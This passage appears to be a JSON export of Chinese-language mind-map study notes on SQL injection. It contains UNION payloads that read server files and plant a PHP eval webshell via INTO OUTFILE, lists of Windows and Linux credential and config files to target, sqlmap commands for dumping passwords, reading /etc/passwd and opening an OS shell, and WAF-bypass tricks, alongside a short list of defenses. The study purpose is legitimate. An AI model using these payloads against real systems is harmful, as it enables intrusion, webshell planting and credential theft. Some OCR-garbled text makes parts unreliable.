file(\n0x433A5C5C57494E444F57535C5C73797374\n656D33325C5C696E65747372765C5C4D657\n461426173652E786D6C)+--+&Submit=\nSubmit路径记得转化为十六进制\n源路径为:C:\\WINDOWS\\\\system32\\\ninetsrvlMetaBase.xml","layout_left_offset":{"x":-372.49999444931746,"y":-81.24999878928054}},"children":[]},{"data":{"id":"d6ovt0jdcwg0","created":1735546267689,"text":"常见WINDOWS下配置文件:\nc:/windows/php.ini //php配置信息\nc:/windows/my.ini //MYSQL配置文件，记录管\n理员登陆过的MYSQL用户名和密码\nc:\\mysql\\data\\mysqluser.MYD //存储了\nmysql.user表中的数据库连接密码\nc:\\windows\\system32\\inetsrvMetaBase.xml\n查看IlS的虚拟主机配置\nd:\\APACHE\\Apache2\\confhttpd.conf\nc:\\windows\\repairsam //存储了WINDOWS系\n统初次安装的密码","layout_left_offset":{"x":-334.999995008111,"y":-58.74999912455689}},"children":[]},{"data":{"id":"d6ovt0m3mtk0","created":1735546267855,"text":"LUNIX/UNIX 下:\n/usr/local/app/apache2/conf/httpd.conf//\napache2缺省配置文件\n/usr/local/apache2/conf/httpd.conf\n/usr/local/app/apache2/conf/extra/httpd-\nvhosts.conf//虚拟网站设置\n/usr/local/app/php5/lib/php.ini //PHP相关设\n置\n/etc/sysconfig/iptables //从中得到防火墙规则\n策略\n/etc/httpd/conf/httpd.conf//apache配置文\n件\n/etc/rsyncd.conf //同步程序配置文件\n/etc/my.cnf//mysql的配置文件\n/etc/redhat-release //系统版本\n/usr/local/resin-3.0.22/conf/resin.conf 针对3.\n0.22的RESIN配置文件查看","layout_left_offset":{"x":-642.4999904260042,"y":-243.74999636784185}},"children":[]},{"data":{"id":"d6ovt0oqkx40","created":1735546268013,"text":"服务器读取文件","layout_left_offset":{"x":-211.24999685212993,"y":-249.9999962747097}},"children":[{"data":{"id":"d6ovve6wpkw0","created":1735546454138,"text":"union%20select%201,load file('c:\\\\boot,\nini')+--+&Submit=Submit","layout_left_offset":{"x":-46.249999310821295,"y":1.2499999813734348}},"children":[]}]},{"data":{"id":"d6ovviwzvu80","created":1735546464423,"text":"写webshell获取权限","layout_left_offset":{"x":-279.9999958276751,"y":-228.74999659135938}},"children":[{"data":{"id":"d6ovvz234yg0","created":1735546499559,"text":"union select \"<?php @eval($ POST[\n123'});?>\",2 into outfile \"C:\\phpStudy\\\nWWW\\123.php\"+--+&Submit=Submit","layout_left_offset":{"x":-18.749999720603228,"y":-23.74999964609742}},"children":[]}]}]}]},{"data":{"id":"d6ovxwail480","created":1735546650267,"text":"sqlmap","layout_left_offset":{"x":-51.2499992363156,"y":-18.74999972060317},"expandState":"expand"},"children":[{"data":{"id":"d6ovy49h2000","created":1735546667618,"text":"-u get注入"},"children":[]},{"data":{"id":"d6ovy4pqpqw0","created":1735546668602,"text":"-r 指定参数注入 sqlmap.py-rpost.txt -p 注入参数"},"children":[]},{"data":{"id":"d6ovy4shn6o0","created":1735546668768,"text":"--level=LEVEL"},"children":[{"data":{"id":"d6ovyvxxuqg0","created":1735546727871,"text":"执行测试的等级(1-5，默认为1),使用-level 参\n数目数值>=2的时候也会检查cookie里面的参\n数，当>=3的时候将检查User-agent和Referer.","layout_left_offset":{"x":-36.24999945983291,"y":-3.749999944120532}},"children":[]}]},{"data":{"id":"d6ovy4v9y4o0","created":1735546668936,"text":"--risk=RISK"},"children":[{"data":{"id":"d6ovzccfmbc0","created":1735546763575,"text":"执行测试的风险(0-3，默认为1),默认是1会测\n试大部分的测试语句，2会增加基于事件的测试\n语句，3会增加OR语句的SQL注入测试。","layout_left_offset":{"x":-38.74999942258012,"y":-7.499999888241291}},"children":[]}]},{"data":{"id":"d6ovy56t7x40","created":1735546669634,"text":"-v","layout_left_offset":{"x":-49.999999254942054,"y":-58.74999912455678}},"children":[{"data":{"id":"d6ow059s1hs0","created":1735546826542,"text":"ERBOSE信息级别: 0-6(缺省1)，其值具体含\n义:“0”只显示python错误以及严重的信息;\n1同时显示基本信息和警告信息(默认);“2'\n同时显示debug信息;“3”同时显示注入的\npayload;“4”同时显示HTTP请求;“5”同时\n显示HTTP响应头;“6”同时显示HTTP响应页\n面;如果想养到sqlmap发送的测试payload最好\n的等级就是3。","layout_left_offset":{"x":-323.7499951757492,"y":-78.74999882653356}},"children":[]}]},{"data":{"id":"d6ow0axelg00","created":1735546838854,"text":"-p 后面接参数，针对单个参数注入","layout_left_offset":{"x":-34.99999947845947,"y":-99.999998509884}},"children":[]},{"data":{"id":"d6ow0aznk800","created":1735546838990,"text":"-threads","layout_left_offset":{"x":-54.99999918043602,"y":-87.49999869614845}},"children":[{"data":{"id":"d6ow0m960c00","created":1735546863510,"text":"线程数，如果你想让sqlmap跑的更快，可以更改\n这个线程 数的值，默认值为10\n-threads","layout_left_offset":{"x":-132.49999802559603,"y":-77.49999884516012}},"children":[]}]},{"data":{"id":"d6ow0b1wksw0","created":1735546839126,"text":"-batch-smart        智能判断测试","layout_left_offset":{"x":-116.24999826773978,"y":-97.49999854713678}},"children":[]},{"data":{"id":"d6ow0b3hr5k0","created":1735546839222,"text":"--mobile         模拟测试手机环境站点","layout_left_offset":{"x":-77.49999884516012,"y":-98.74999852851022}},"children":[]},{"data":{"id":"d6ow0b7l5hc0","created":1735546839470,"text":"-m 批量注入","layout_left_offset":{"x":-91.24999864026915,"y":-96.24999856576312}},"children":[]},{"data":{"id":"d6ow1x4ehug0","created":1735546965532,"text":"注入获取数据命令","layout_left_offset":{"x":-137.49999795109045,"y":-162.4999975785612}},"children":[{"data":{"id":"d6ow2i2t7cg0","created":1735547011147,"text":"--dbs //默认情况系sqlmap会自动的探测web应\n用后端的数据库类型:MySQL、Oracle、\nPostgreSQL、 MicrosoftSQL Server.\nMicrosoft Access、 SQLite、 Firebird.\nSybase、SAPMaxDB、DB2\n--current-user:大多数数据库中可检测到数据\n库管理系统当前用户\n--current-db:当前连接数据库名\n--is-dba:判断当前的用户是否为管理\n--users:列出数据库所有所有用户","layout_left_offset":{"x":-99.999998509884,"y":-124.99999813735474}},"children":[]}]},{"data":{"id":"d6ow299junk0","created":1735546991963,"text":"获取表名","layout_left_offset":{"x":-179.99999731779099,"y":-228.74999659135926}},"children":[{"data":{"id":"d6ow2xk84mg0","created":1735547044852,"text":"--tables -D 数据库名","layout_left_offset":{"x":-19.999999701976776,"y":-16.249999757856244}},"children":[]}]},{"data":{"id":"d6ow29bvrc00","created":1735546992104,"text":"字段名","layout_left_offset":{"x":-188.74999718740582,"y":-222.49999668449163}},"children":[{"data":{"id":"d6ow3ao94ds0","created":1735547073393,"text":"--columns -T 表名 -D 数据库名","layout_left_offset":{"x":9.999999850988388,"y":-1.1368683772161603e-13}},"children":[]}]},{"data":{"id":"d6ow29dvcsw0","created":1735546992225,"text":"数据内容","layout_left_offset":{"x":-206.24999692663562,"y":-213.7499968148768}},"children":[{"data":{"id":"d6ow3rlj4g80","created":1735547110234,"text":"-T表名-C username，password --dump","layout_left_offset":{"x":11.249999832361937,"y":-7.499999888241405}},"children":[]}]},{"data":{"id":"d6ow29fx9so0","created":1735546992349,"text":"读取文件内容","layout_left_offset":{"x":-203.7499969638884,"y":-213.7499968148768}},"children":[{"data":{"id":"d6ow431aq400","created":1735547135132,"text":"--file-read /etc/password"},"children":[]}]},{"data":{"id":"d6ow29k235c0","created":1735546992599,"text":"系统交互的shell           --os-shell","layout_left_offset":{"x":-209.99999687075615,"y":-211.24999685212958}},"children":[]}]},{"data":{"id":"d6ow4ikyptc0","created":1735547168973,"text":"注释","layout_left_offset":{"x":-46.249989625066405,"y":-445.50000793486834},"expandState":"expand"},"children":[{"data":{"id":"d6ow4qt77e00","created":1735547186885,"text":"#"},"children":[]},{"data":{"id":"d6ow4rot6lc0","created":1735547188796,"text":"--"},"children":[]},{"data":{"id":"d6ow4rrbfhc0","created":1735547188948,"text":"/*"},"children":[]}]}]},{"data":{"id":"d6owev1tiao0","created":1735547979755,"text":"注入防御","layout_mind_offset":{"x":-381.2499818019569,"y":-711.7500003911555},"expandState":"expand"},"children":[{"data":{"id":"d6owf0km5sw0","created":1735547991775,"text":"函数过滤","layout_left_offset":{"x":1.2499999813736622,"y":4.999999925494251}},"children":[]},{"data":{"id":"d6owf0r53fc0","created":1735547992170,"text":"直接下载相关防范注入文件，通过incloud包合放\n在网站配置文件里面","layout_left_offset":{"x":-27.499999590218067,"y":-1.2499999813735485}},"children":[]},{"data":{"id":"d6owf0t7ew80","created":1735547992295,"text":"pdo预处理 使用预编译语句\nhttp://www.php.cn/course/868.html","layout_left_offset":{"x":-92.49999862164253,"y":-9.999999850988388}},"children":[]},{"data":{"id":"d6owf0vpkc80","created":1735547992446,"text":"使用白名单来规范化输入验证方法","layout_left_offset":{"x":-52.49999921768915,"y":-11.249999832361993}},"children":[]},{"data":{"id":"d6owf0x13dc0","created":1735547992526,"text":"对客户端输入进行控制，不允许输入 SQL注入相\n关的特殊字符","layout_left_offset":{"x":-37.49999944120651,"y":-16.249999757856358}},"children":[]},{"data":{"id":"d6owhefjg5k0","created":1735548178672,"text":"服务器端在提交数据库进行 SQL查询之前，对特\n殊字符进行过滤、转义、替换、删除。","layout_left_offset":{"x":-29.99999955296539,"y":-17.49999973922968}},"children":[]},{"data":{"id":"d6owhengqko0","created":1735548179151,"text":"使用waf 安全狗 防火墙等","layout_left_offset":{"x":-39.999999403953666,"y":-14.999999776482696}},"children":[]}]},{"data":{"id":"d6owhsi9oe00","created":1735548209312,"text":"绕过waf","layout_mind_offset":{"x":828.2499996088445,"y":-1194.499993406236},"expandState":"expand"},"children":[{"data":{"id":"d6owhxtbe600","created":1735548220864,"text":"1大小写变形"},"children":[]},{"data":{"id":"d6owhyu35ko0","created":1735548223087,"text":"2改变编码"},"children":[]},{"data":{"id":"d6owhywmzvc0","created":1735548223241,"text":"3添加注释"},"children":[]},{"data":{"id":"d6owhyygeqw0","created":1735548223351,"text":"4双写法"},"children":[]},{"data":{"id":"d6owimr5v540","created":1735548275153,"text":"5利用符号&&||         ' || updatexml() --"},"children":[]},{"data":{"id":"d6owimx7mg80","created":1735548275519,"text":"6字符串变型"},"children":[]}]}]},"template":"default","theme":"fresh-blue","version":"1.4.43"}